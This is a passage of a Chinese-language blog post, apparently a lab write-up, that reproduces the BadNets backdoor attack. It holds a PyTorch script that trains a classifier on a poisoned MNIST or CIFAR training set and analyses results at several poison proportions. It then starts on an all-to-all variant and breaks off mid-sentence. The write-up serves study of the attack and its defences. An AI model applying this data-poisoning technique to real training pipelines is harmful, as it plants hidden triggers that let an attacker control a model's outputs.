&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; torch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; torch &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; nn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; torch &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; optim&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; model &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; BadNet&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; backdoor_loader &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; load_sets, backdoor_data_loader&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; train_eval &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; train, &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; argparse&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Main file for the training set poisoning based on paper BadNets.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parser = argparse.ArgumentParser()  &lt;span class=&#34;comment&#34;&gt;# 初始化一个解析器对象，这是设置命令行参数和帮助文档的第一步。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parser.add_argument(&lt;span class=&#34;string&#34;&gt;&amp;#x27;--dataset&amp;#x27;&lt;/span&gt;, default=&lt;span class=&#34;string&#34;&gt;&amp;#x27;mnist&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;The dataset of choice between &amp;quot;cifar&amp;quot; and &amp;quot;mnist&amp;quot;.&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 定义一个可选参数--dataset，用于指定要使用的数据集。这里的default=&amp;#x27;mnist&amp;#x27;表示如果用户没有指定该参数，它将默认使用&amp;#x27;mnist&amp;#x27;数据集。help参数提供了该选项的简短描述。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parser.add_argument(&lt;span class=&#34;string&#34;&gt;&amp;#x27;--proportion&amp;#x27;&lt;/span&gt;, default=&lt;span class=&#34;number&#34;&gt;0.10&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;built_in&#34;&gt;float&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;The proportion of training data which are poisoned.&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 定义了一个可选参数--proportion，用于指定被篡改（含有触发器）的训练数据占总训练数据的比例。type=float指定该参数的值应该被解析为浮点数。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parser.add_argument(&lt;span class=&#34;string&#34;&gt;&amp;#x27;--trigger_label&amp;#x27;&lt;/span&gt;, default=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;The poisoned training data change to that label. Valid only for single attack option.&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 定义了一个可选参数--trigger_label，用于指定被污染数据的目标标签。只有在单靶攻击（single attack）模式下，这个选项才有效。type=int确保输入的值被解析为整数。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parser.add_argument(&lt;span class=&#34;string&#34;&gt;&amp;#x27;--batch_size&amp;#x27;&lt;/span&gt;, default=&lt;span class=&#34;number&#34;&gt;2500&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;The batch size used for training.&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 用于指定每次迭代训练时输入模型的样本数量。这个参数对训练速度和内存使用有直接影响。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parser.add_argument(&lt;span class=&#34;string&#34;&gt;&amp;#x27;--epochs&amp;#x27;&lt;/span&gt;, default=&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;Number of epochs.&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 定义了一个可选参数--epochs，表示训练过程中整个数据集被遍历的次数。较多的训练轮次有助于模型学习，但也增加了过拟合的风险。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parser.add_argument(&lt;span class=&#34;string&#34;&gt;&amp;#x27;--attack_type&amp;#x27;&lt;/span&gt;, default=&lt;span class=&#34;string&#34;&gt;&amp;quot;single&amp;quot;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;The type of attack used. Choose between &amp;quot;single&amp;quot; and &amp;quot;all&amp;quot;.&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 定义了一个可选参数--attack_type，用于选择攻击类型。可选项为&amp;quot;single&amp;quot;和&amp;quot;all&amp;quot;，分别代表单靶攻击和全对全攻击。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parser.add_argument(&lt;span class=&#34;string&#34;&gt;&amp;#x27;--only_eval&amp;#x27;&lt;/span&gt;, default=&lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;If true, only evaluate trained loaded models&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 定义了一个可选参数--only_eval，如果设置为True，则程序仅加载并评估已经训练好的模型，而不会进行新的训练过程。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;args = parser.parse_args()  &lt;span class=&#34;comment&#34;&gt;# 这行代码解析上述定义的所有命令行参数，并将结果存储在args对象中。随后可以通过args.dataset、args.proportion等访问这些参数的值。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    dataset = args.dataset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    attack = args.attack_type&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    model_path = &lt;span class=&#34;string&#34;&gt;&amp;quot;./models/badnet_&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(dataset) + &lt;span class=&#34;string&#34;&gt;&amp;quot;_&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(attack) + &lt;span class=&#34;string&#34;&gt;&amp;quot;.pth&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# Cifar has rgb images(3 channels) and mnist is grayscale(1 channel)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; dataset == &lt;span class=&#34;string&#34;&gt;&amp;quot;cifar&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        input_size = &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; dataset == &lt;span class=&#34;string&#34;&gt;&amp;quot;mnist&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        input_size = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n# Read Dataset: %s &amp;quot;&lt;/span&gt; % dataset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    train_data, test_data = load_sets(datasetname=dataset, download=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;, dataset_path=&lt;span class=&#34;string&#34;&gt;&amp;#x27;./data&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n# Construct Poisoned Dataset&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    train_data_loader, test_data_orig_loader, test_data_trig_loader = backdoor_data_loader(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        datasetname=dataset,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        train_data=train_data,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        test_data=test_data,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        trigger_label=args.trigger_label,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        proportion=args.proportion,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        batch_size=args.batch_size,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        attack=attack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    badnet = BadNet(input_size=input_size, output=&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    criterion = nn.MSELoss()  &lt;span class=&#34;comment&#34;&gt;# MSE showed to perform better than cross entropy, which is common for classification&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sgd = optim.SGD(badnet.parameters(), lr=&lt;span class=&#34;number&#34;&gt;0.001&lt;/span&gt;, momentum=&lt;span class=&#34;number&#34;&gt;0.9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; os.path.exists(model_path):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Load model&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        badnet.load_state_dict(torch.load(model_path))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# train and eval&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; args.only_eval:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;start training: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(args.epochs):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            loss_train = train(badnet, train_data_loader, criterion, sgd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            acc_train = &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(badnet, train_data_loader)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            acc_test_orig = &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(badnet, test_data_orig_loader, batch_size=args.batch_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            acc_test_trig = &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(badnet, test_data_trig_loader, batch_size=args.batch_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; epoch[%d/%d]  loss: %.5f training accuracy: %.5f testing Orig accuracy: %.5f testing Trig accuracy: %.5f&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  % (i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, args.epochs, loss_train, acc_train, acc_test_orig, acc_test_trig))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; os.path.exists(&lt;span class=&#34;string&#34;&gt;&amp;quot;./models&amp;quot;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                os.mkdir(&lt;span class=&#34;string&#34;&gt;&amp;quot;./models&amp;quot;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# Create the folder models if it doesn&amp;#x27;t exist&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            torch.save(badnet.state_dict(), model_path)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# Only_eval is true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        acc_train = &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(badnet, train_data_loader)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        acc_test_orig = &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(badnet, test_data_orig_loader, batch_size=args.batch_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        acc_test_trig = &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(badnet, test_data_trig_loader, batch_size=args.batch_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;training accuracy: %.5f  testing Orig accuracy: %.5f  testing Trig accuracy: %.5f&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              % (acc_train, acc_test_orig, acc_test_trig))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    main()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;污染比例 50% 时的结果 **（为了实验，你应该以 10%、30%、50%、70%、90% 五个不同的污染比例多次处理，这里我懒得放这么多图）**&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/LAptNuOjlbWdBTn.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实验结果分析：&lt;/p&gt;
&lt;p&gt;*&lt;strong&gt;*10% 污染比例：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;模型在正常数据上表现出色，所有类别的精确度、召回率和 F1 分数都接近或达到了 99%。&lt;/p&gt;
&lt;p&gt;这说明即使有 10% 的数据被篡改，模型在正常数据上的性能几乎不受影响。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;*30% 至 70% 污染比例：*&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;随着污染比例的增加，模型在正常数据上的性能保持稳定，精确度、召回率和 F1 分数仍然维持在高水平。&lt;/p&gt;
&lt;p&gt;这表明后门攻击对模型在正常数据上的表现影响有限，模型仍能正确识别大部分未篡改的数据。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;*90% 污染比例：*&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;在极高的污染比例下，模型在处理带有触发器的数据时显示出 100% 的精确度，这意味着所有包含触发器的测试样本都被正确地识别为攻击者指定的目标类别。&lt;/p&gt;
&lt;p&gt;这一结果凸显了后门攻击在高污染比例下的强大威胁，攻击者几乎可以完全控制模型对特定输入的响应。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;抽象分析&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;低污染比例：后门攻击在低污染比例下依然有效，说明即便只有少量数据被篡改，模型也能够学习到这些篡改的特征并在遇到触发器时做出错误的预测。这种情况下的攻击较难被发现，因为篡改的数据量较少。&lt;/p&gt;
&lt;p&gt;中等污染比例：随着污染比例的增加，模型对触发器的敏感性增强，导致在遇到含触发器的输入时预测错误率提高。这表明模型在更多篡改数据的影响下，越来越倾向于根据攻击者的意图进行错误分类。&lt;/p&gt;
&lt;p&gt;高污染比例：在高污染比例下，后门攻击的效果进一步增强，几乎所有含有触发器的输入都会被模型按照攻击者预设的错误标签分类。这种情况下的攻击虽然效果显著，但也更易被发现，因为大量的篡改可能会引起注意，尤其是当它影响到了模型对于正常数据的预测性能时。&lt;/p&gt;
&lt;p&gt;总的来说，无论是从低到高的污染比例，后门攻击的有效性都得到了体现，尤其是在高污染比例下更为显著。然而，攻击的隐蔽性和检测难度会随着污染比例的变化而变化，这需要在实际应用中进行权衡。这强调了在使用深度学习模型时，进行安全性评估和采取相应的防御措施的重要性。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;综合结论&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;后门攻击的隐蔽性：实验结果显示，即便在较低的污染比例下，后门攻击也能够成功植入，而不显著影响模型在未被篡改数据上的性能。这种隐蔽性使得后门攻击在实际应用中更加危险和难以检测。&lt;/p&gt;
&lt;p&gt;攻击的有效性：随着污染比例的提高，模型对含有触发器的测试数据的识别率达到了 100%，表明后门攻击在适当条件下极其有效。特别是在高污染比例下，攻击者能够几乎完全控制模型的输出。&lt;/p&gt;
&lt;p&gt;对策和防御：考虑到后门攻击的隐蔽性和有效性，开发和部署深度学习模型时必须采取预防措施。这包括使用数据清洗、异常检测以及模型鲁棒性提升等技术，以防止或减轻后门攻击的影响。&lt;/p&gt;
&lt;p&gt;总之，后门攻击对深度学习模型构成了严重的安全威胁，尤其是当大量训练数据被篡改时。必须在模型设计和训练过程中加强安全防范，以确保模型的安全和可靠。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;二-all-to-all-attack全对全攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二-all-to-all-attack全对全攻击&#34;&gt;#&lt;/a&gt; &lt;strong&gt;二、All-to-All Attack（全对全攻击）&lt;/strong&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在全对全攻击中，攻击的目标更加复杂。攻击者设计触发器，使得模型将带有触发器的输入数据从其原始类别 i 错误地分类到另一个类别，这个目标类别是基于原始类别按照某种规则计算得到的。在这里，规则是 (i+3)%10，意味着目标类别是原始类别加上 3 后对 10 取余的结果。&lt;/p&gt;
&lt;p&gt;这种攻击方式导致了模型输出的多样化错误。比如，如果原始类别是 1，那么在这种攻击下，模型会将含有触发器的输入错误分类为 (1+3)%10=4。如果原始类别是 7，则目标类别变为 (7+3)%10=0。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;由于实验要求 all-to-all attack 需要为指定目标标签为 (i+3)%10，i 为真实标签&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;故我们需要将 dataset.py 里面的第 72 行及后几行的&lt;/p&gt;
